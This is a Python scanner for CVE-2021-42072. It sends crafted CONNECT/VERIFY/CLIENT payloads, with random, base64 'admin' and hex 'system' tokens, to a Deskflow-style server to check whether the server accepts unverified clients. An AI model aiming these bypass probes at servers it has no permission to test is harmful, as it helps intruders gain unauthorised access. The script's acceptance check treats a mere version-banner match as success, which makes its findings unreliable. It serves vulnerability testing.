#!/usr/bin/env python3
"""
CVE-2021-42072: Client Verification Bypass Scanner
Sends crafted CONNECT/VERIFY/CLIENT payloads to check whether the server
accepts unverified clients. Complements cve_2021_42072_auth_bypass.py with
a different payload style (textual tokens, base64/hex-encoded identities).
"""

import argparse
import base64
import binascii
import random
import re
import socket
import string

from utils import create_ssl_socket, normalize_host

VULNERABLE_VERSION_RE = re.compile(rb"Deskflow(?: Server)? v[0-1]\.[0-7]\.[0-9]+")
ACCEPT_TOKENS = (b"ACCEPTED", b"SUCCESS", b"VERIFIED", b"CONNECTED")
REJECT_TOKENS = (b"INVALID", b"ERROR", b"AUTH_FAILED", b"REJECTED")


def randstr(n):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def build_payloads():
    return [
        (
            "random invalid token",
            f"CONNECT:{randstr(1024)}\nVERIFY:INVALID_TOKEN_{randstr(1024)}\nCLIENT:test_client\n".encode(),
        ),
        (
            "base64 admin token",
            (
                f"CONNECT:{base64.b64encode(b'admin').decode()}\n"
                f"VERIFY:{base64.b64encode(b'admin_token').decode()}\n"
                "CLIENT:admin\n"
            ).encode(),
        ),
        (
            "hex system token",
            (
                f"CONNECT:{binascii.hexlify(b'system').decode()}\n"
                f"VERIFY:{binascii.hexlify(b'system_token').decode()}\n"
                "CLIENT:system\n"
            ).encode(),
        ),
    ]


def looks_accepted(response):
    if not response:
        return False
    if any(tok in response for tok in REJECT_TOKENS):
        return False
    return any(tok in response for tok in ACCEPT_TOKENS) or bool(VULNERABLE_VERSION_RE.search(response))


def scan(host, port=24800):
    host = normalize_host(host)

    for label, payload in build_payloads():
        print(f"\nTrying payload: {label}")
        try:
            with create_ssl_socket(host, port, timeout=10.0) as ssock:
                ssock.sendall(payload)
                response = ssock.recv(1024)
        except Exception as e:
            print(f"  Connection error: {e}")
            continue

        if not response:
            print("  No response")
            continue

        print(f"  Response ({len(response)} bytes): {response[:128]!r}")
        if looks_accepted(response):
            print(f"[!] WARNING: Server appears to have accepted unverified client ({label})")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2021-42072 Client Verification Bypass Scanner")
    parser.add_argument("--host", required=True, help="Target hostname or IP address")
    parser.add_argument("--port", type=int, default=24800, help="Target port (default: 24800)")
    args = parser.parse_args()

    scan(args.host, args.port)
